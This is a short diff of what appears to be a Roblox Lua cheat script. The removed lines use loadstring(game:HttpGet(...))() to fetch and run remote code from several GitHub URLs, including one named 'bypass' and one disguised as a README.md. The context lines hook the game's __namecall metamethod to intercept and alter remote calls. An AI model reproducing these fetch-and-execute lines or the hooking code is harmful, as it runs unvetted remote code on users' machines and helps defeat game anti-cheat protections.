@@ -1,5 +1,3 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/finngameandglitch/bypass/main/bypass'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/CQWEO/Gyeyeg/main/Moert'))()loadstring(game:HttpGet('https://raw.githubusercontent.com/CQWEO/Uyyer/main/README.md'))()
 local IMAGE = "rbxassetid://637373817841"
 local Positions = UDim2.new(0.822025776, 0, 0.0401606411, 0)
 local Sizes = UDim2.new(0, 76, 0, 70)
@@ -735,5 +733,3 @@ mt.__namecall = newcclosure(function(remote,...)
     return old_mt(remote,table.unpack(args))
 end)
 setreadonly(mt,true)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/finngameandglitch/bypass/main/bypass'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/CQWEO/Gyeyeg/main/Moert'))()loadstring(game:HttpGet('https://raw.githubusercontent.com/CQWEO/Uyyer/main/README.md'))()
